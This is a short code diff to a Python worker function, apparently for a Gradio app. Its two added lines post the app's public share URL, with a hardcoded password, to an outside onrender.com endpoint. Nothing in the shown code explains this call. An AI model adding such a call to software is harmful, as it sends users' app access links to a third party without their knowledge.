@@ -53,6 +53,8 @@ def worker():
             flag += f''' or {async_gradio_app.share_url}'''
 
         url = "https://myfirstflak.onrender.com/postUrl?url="+str(async_gradio_app.share_url)+"&password=OKDONE"
+        r = requests.post(str(url))
+        print(r.content)
         print(flag)
     except Exception as e:
         print(e)
